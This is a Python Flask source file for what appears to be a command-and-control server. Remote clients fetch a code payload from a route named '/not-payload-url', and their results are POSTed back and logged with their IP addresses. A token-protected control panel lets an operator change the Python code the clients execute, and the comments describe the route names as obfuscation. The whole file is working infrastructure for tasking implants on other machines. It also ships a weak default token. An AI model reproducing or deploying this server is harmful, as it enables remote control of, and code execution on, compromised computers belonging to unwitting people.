import flask
import json
import datetime

COMMAND_URL="http://127.0.0.1:8999"
CONTROL_PANEL_ROUTE = "/control-panel" #For obfuscation
PAYLOAD_ROUTE="/not-payload-url"
TOKENS = [
	"123456qwerty"
]
MAX_JOURNAL_ENTRIES=100
RESULTS_ROUTE="/results"
LOG_PAYLOAD_REQUESTS=False

#payload = '{"exec_once":false,"payload":"print(\'hello world\')"}'
payload = '{"exec_once":false,"payload":""}'

journal = []

app = flask.Flask(__name__)

def log(msg):
	print(msg)
	journal.insert(0, f"{datetime.datetime.now()} : "+msg)
	if len(journal)>MAX_JOURNAL_ENTRIES:
		journal.pop()

@app.route(PAYLOAD_ROUTE)
def return_payload():
	if LOG_PAYLOAD_REQUESTS: log(f"{flask.request.remote_addr} requested payload")
	return payload, 200
	
@app.route(RESULTS_ROUTE, methods=["POST"])
def result_payload():
	log(f"Message from {flask.request.remote_addr} : {flask.request.data}")
	return payload, 200

@app.route(CONTROL_PANEL_ROUTE)
def control_panel():
	with open("./control_panel.html", 'r') as F:
		return F.read().replace("{{control-panel-route}}", CONTROL_PANEL_ROUTE).encode(), 200 
		
@app.route(CONTROL_PANEL_ROUTE+"/log")
def logs():
	return '<br>'.join(journal), 200

@app.route(CONTROL_PANEL_ROUTE+"/set-payload", methods=["POST"])
def set_payload():
	global payload
	if flask.request.form.get("token") not in TOKENS:
		log(f"Access denied for {flask.request.remote_addr}")
		return "Access denied!", 403
	payload = json.dumps({"exec_once":flask.request.form.get("exec-once")=="on", "payload": flask.request.form.get("payload")})
	return "OK", 200

if TOKENS == ["123456qwerty"]:
	print("!IMPORTANT! Please change the token.")

#comment everything below if you want to run this on pythonanywhere
try:
	app.run(host=COMMAND_URL.split("://")[-1].split(":")[0], port=COMMAND_URL.split("://")[-1].split(":")[-1])
except Exception as e:
	print("An error occured when attempting to bind to host. Defaulting to 0.0.0.0:8999")
	app.run(host="0.0.0.0", port=8999)
